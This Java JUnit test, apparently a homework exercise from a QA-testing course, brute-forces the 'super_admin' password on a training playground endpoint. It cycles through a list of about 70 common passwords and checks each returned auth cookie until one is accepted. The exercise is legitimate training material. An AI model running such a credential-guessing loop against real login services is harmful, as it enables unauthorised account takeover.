import io.restassured.RestAssured;
import io.restassured.response.Response;
import org.junit.jupiter.api.Test;

import java.util.Arrays;
import java.util.HashMap;
import java.util.List;
import java.util.Map;

public class PasswordTests {

    @Test
    public void selectionPassword() {
        String login = "super_admin";
        int iterator = 0;
        List<String> passwords = Arrays.asList("password", "123456", "12345678", "qwerty", "abc123", "12345", "1234567",
                "monkey", "123456789", "1234567890", "letmein", "dragon", "baseball", "1234", "sunshine", "iloveyou",
                "trustno1", "princess", "football", "adobe123[a]", "welcome", "login", "admin", "qwerty123", "solo",
                "1q2w3e4r", "master", "111111", "666666", "photoshop[a]", "1qaz2wsx", "qwertyuiop", "ashley", "mustang",
                "121212", "starwars", "654321", "bailey", "access", "flower", "123123", "555555", "passw0rd", "shadow",
                "lovely", "7777777", "michael", "!@#$%^&*", "jesus", "superman", "hello", "charlie", "888888", "696969",
                "hottie", "freedom", "aa123456", "qazwsx", "ninja", "azerty", "loveme", "whatever", "donald", "batman",
                "zaq1zaq1", "000000", "123qwe");

        String message = "You are NOT authorized";
        String password = "";

        while (message.equals("You are NOT authorized")) {
            password = passwords.get(iterator);
            Map<String, String> credentials = new HashMap<>();
            credentials.put("login", login);
            credentials.put("password", password);

            Response response = RestAssured
                    .given()
                    .params(credentials)
                    .when()
                    .post("https://playground.learnqa.ru/ajax/api/get_secret_password_homework")
                    .andReturn();
            String cookie = response.getCookie("auth_cookie");
            Map<String, String> authCookie = new HashMap<>();
            authCookie.put("auth_cookie", cookie);

            Response validateCookie = RestAssured
                    .given()
                    .cookies(authCookie)
                    .when()
                    .get("https://playground.learnqa.ru/ajax/api/check_auth_cookie")
                    .andReturn();

            message = validateCookie.asString();

            iterator++;
        }

        System.out.println("ответ с правильными cookies: " + message);
        System.out.println("Верный пароль: " + password);
    }

}
